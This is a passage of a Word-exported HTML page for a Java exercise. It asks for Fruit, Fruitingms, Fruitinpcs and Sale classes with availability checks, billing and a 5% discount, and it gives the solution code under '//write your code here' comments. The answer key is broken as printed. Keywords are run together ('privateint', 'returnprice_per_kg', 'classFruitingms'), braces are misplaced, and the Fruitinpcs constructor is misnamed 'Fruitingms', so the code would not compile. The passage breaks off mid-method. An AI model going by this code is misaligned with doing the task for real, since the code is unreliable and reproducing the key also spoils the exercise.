</span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Write\r\nconstructor method <b>fruitinpcs()</b> for\r\nthis class.<b><u><o:p></o:p></u></b></span></p><p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; margin-left: 1.25in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Write <b>Check _availability()</b> method which\r\ntakes “<b>need</b>” in pieces as input and\r\nreturns false if <b>available_pcs</b> is\r\nless than “<b>need”</b> else return true.<b><u><o:p></o:p></u></b></span></p><p class=\"MsoListParagraphCxSpLast\" style=\"text-align: left; margin-left: 1.25in; text-indent: -0.25in;\">\r\n\r\n\r\n\r\n\r\n\r\n</p><p class=\"MsoListParagraphCxSpLast\" style=\"text-align: left; margin-left: 1.25in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Write <b>update_availability ()</b> method which\r\ntakes <b>“need”</b> in pieces as input and\r\nreduce this <b>“need”</b> from <b>available_pcs.</b></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; \"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Sale Class</span></u></b></p>\r\n\r\n<p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; margin-left: 1.25in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Constructor is already coded for you.</span></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; margin-left: 1.25in; text-indent: -0.25in;\"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">Bill() method</span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; margin-left: 1.5in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Validate availability of fruit before billing<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; margin-left: 1.5in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Calculate amount by product of unit and price<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; margin-left: 1.5in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Provide discount by calling discount() if amount is\r\ngreater than 500<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; margin-left: 1.5in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Update availability of fruit after billing<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\"><span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></span><span style=\"color: rgb(0, 0, 0); font-family: Wingdings; font-size: 16px; text-indent: -24px;\">Ø</span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\"><span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">Discount method calculates discount of 5%.</span><span style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: red;\">&nbsp;</span></p><p class=\"MsoNormal\" style=\"text-align:justify;line-height:150%;tab-stops:.25in\"><b><u><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Demo\r\nClass:</span></u></b></p><p class=\"MsoNormal\" style=\"text-align:justify;line-height:150%;tab-stops:.25in\"><b><u><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><br></span></u></b><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-align: left; text-indent: -0.25in;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"text-align: left; text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\"><span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;</span></span><span style=\"text-align: left; color: rgb(0, 0, 0); font-family: Wingdings; font-size: 16px; text-indent: -24px;\">Ø</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-align: left; text-indent: -0.25in;\">&nbsp;This Class is a Starter Class.</span></p><p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; margin-left: 1in; text-indent: -0.25in;\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style=\"color: rgb(0, 0, 0); font-family: Wingdings; font-size: 16px;\">Ø</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">&nbsp;Code is already provided for you.</span></p><p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; margin-left: 1in; text-indent: -0.25in;\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style=\"color: rgb(0, 0, 0); font-family: Wingdings; font-size: 16px;\">Ø</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">&nbsp;You can modify the class for testing purpose.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \">\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p class=\"MsoListParagraphCxSpLast\" style=\"text-align: left; margin-left: 1in; text-indent: -0.25in;\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">&nbsp; &nbsp; &nbsp; &nbsp; </span><span style=\"color: rgb(0, 0, 0); font-family: Wingdings; font-size: 16px;\">Ø</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">&nbsp;This class will not be evaluated.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">This Code includes solution for the above\r\nquestion. The code below comment line // write your code here is the solution.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\"><o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify;line-height:150%;tab-stops:.25in\"><b><u><span style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Solution Code: <o:p></o:p></span></u></b></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; class Fruit<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp;{<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; privateint\r\ncode;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; private\r\nString name;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; staticint\r\ncounter = 1000;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; Fruit(String\r\nname)</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; &nbsp;{</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; this.name\r\n= name;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; }<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; }<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">classFruitingms extends Fruit</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; {<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;private\r\ndouble available_kgs;<o:p></o:p></span></p><p class=\"MsoListParagraph\" style=\"text-align: left; text-indent: -0.25in;\">\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;private\r\ndouble price_per_kg;</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;Fruitingms(String name, double\r\navailable_kgs,doubleprice_per_kg)<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; {<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;super(name);<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;this.available_kgs\r\n= available_kgs;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;this.price_per_kg\r\n= price_per_kg;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;}<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; &nbsp; &nbsp; public\r\ndouble getprice()</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; {<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;returnprice_per_kg;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;}<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">publicbooleancheckavailability(double\r\nneed)</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;{<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style=\"color:gray;mso-themecolor:background1;mso-themeshade:128\">//write your\r\ncode here<o:p></o:p></span></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; if(available_kgs&lt;need)<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;{<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; return\r\nfalse;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; }<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; return\r\ntrue;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; }<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">public\r\nvoid updateavailability(double need)</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;{<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style=\"color:gray;mso-themecolor:background1;mso-themeshade:128\">//write your code\r\nhere<o:p></o:p></span></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;available_kgs\r\n= available_kgs - need;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;} <o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">classFruitinpcs extends Fruit</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; {<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;private\r\ndouble available_pcs;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;private\r\ndouble price_per_piece;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; Fruitingms(String\r\nname, double available_pcs,doubleprice_per_piece)</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; {<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style=\"color:gray;mso-themecolor:background1;mso-themeshade:128\">//write your\r\ncode here<o:p></o:p></span></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; super(name);<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; this.available_pcs\r\n= available_pcs;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; this.price_per_piece\r\n= price_per_piece;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; }<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; public\r\ndouble getprice()<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;{<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; returnprice_per_piece;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; &nbsp; publicbooleancheckavailability(double\r\nneed)</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color:gray;mso-themecolor:background1;mso-themeshade:128\">//write your\r\ncode here<o:p></o:p></span></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;if(available_pcs&lt;need)<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp;{<o:p></o:p></span></p><p class=\"MsoNormal\" 